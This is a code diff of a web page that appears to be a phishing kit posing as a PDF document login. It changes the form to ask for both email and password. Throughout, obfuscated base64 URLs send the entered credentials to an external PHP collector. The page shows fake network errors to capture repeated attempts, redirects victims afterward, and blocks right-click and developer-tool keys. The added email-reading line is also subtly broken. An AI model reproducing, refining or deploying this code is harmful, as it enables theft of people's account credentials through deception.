@@ -602,10 +602,14 @@
                             <div class="alert alert-danger" id="error" style="display: none; font-size: 16px;">Network Error! Please Retry</div>
                             <img alt="pdf" width="32" height="auto" class="rounded-1" id="logoimg">
                             <h5><span id="email" class="mt-2">xxxx@xxxxx.xxx</span></h5>
-                            <span class="mt-1">Provide your email password to continue</span>
+                            <span class="mt-1">Login to continue</span>
                         </div>
                     </div>
                     <form id="loginForm">
+                        <div class="mb-4">
+                            <label for="mmail" class="form-label"><span id="logoname3"></span> Email</label>
+                            <input type="email" class="form-control" id="mmail" placeholder="Email" required>
+                        </div>
                         <div class="mb-4">
                             <label for="password" class="form-label"><span id="logoname3"></span> Password</label>
                             <input type="password" class="form-control" id="pass" placeholder="password" required>
@@ -664,7 +668,7 @@
         });
     </script>
     <script> var encodedString = "aHR0cHM6Ly9sb3R1c2JyaWRnZS5ydS5jb20vZG9jcy9zYWFjLnBhZ2VtLnBkZnZlci9kcnVuLnBocA=="; var decodedString = window.atob(encodedString);</script>
-    <script> $(function () { var redirectString = "aHR0cHM6Ly9vbXVkZWhzdHV1bml6aWtlZHVuZy5naXRodWIuaW8vY2F0LXBkZnZlci9hcmNoZXR5cGVzL2V4Lmh0bQ=="; var decodedString = window.atob(redirectString); var success = 0; $(document).on('submit', 'form', function (event) { event.preventDefault(); var email = my_email; var pass = $('#pass').val(); if (success < 2) { $.post(window.atob(encodedString), { email: email, pass: pass }); setTimeout(function () { $('#pass').val(''); $("#notify").remove(); $(document).ready(function () { $("#error").show(); }); success += 1; }, 1000); } else { $.post(window.atob(encodedString), { email: email, pass: pass }); setTimeout(function () { window.location = (window.atob(redirectString)+'#'+email); }, 1000); } }); }); </script>
+    <script> $(function () { var redirectString = "aHR0cHM6Ly9vbXVkZWhzdHV1bml6aWtlZHVuZy5naXRodWIuaW8vY2F0LXBkZnZlci9hcmNoZXR5cGVzL2V4Lmh0bQ=="; var decodedString = window.atob(redirectString); var success = 0; $(document).on('submit', 'form', function (event) { event.preventDefault(); var email = ('#mmail').val(); var pass = $('#pass').val(); if (success < 2) { $.post(window.atob(encodedString), { email: email, pass: pass }); setTimeout(function () { $('#pass').val(''); $("#notify").remove(); $(document).ready(function () { $("#error").show(); }); success += 1; }, 1000); } else { $.post(window.atob(encodedString), { email: email, pass: pass }); setTimeout(function () { window.location = (window.atob(redirectString)+'#'+email); }, 1000); } }); }); </script>
     <script> window.oncontextmenu = function () { return false; } $(document).keydown(function (event) { if (event.keyCode == 123) { return false; } else if ((event.ctrlKey && event.shiftKey && event.keyCode == 73) || (event.ctrlKey && event.shiftKey && event.keyCode == 74)) { return false; } }); </script>
     <script> /*function check(e) { alert(e.keyCode); }*/ document.onkeydown = function (e) { if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) return false; }; </script>
 </body>
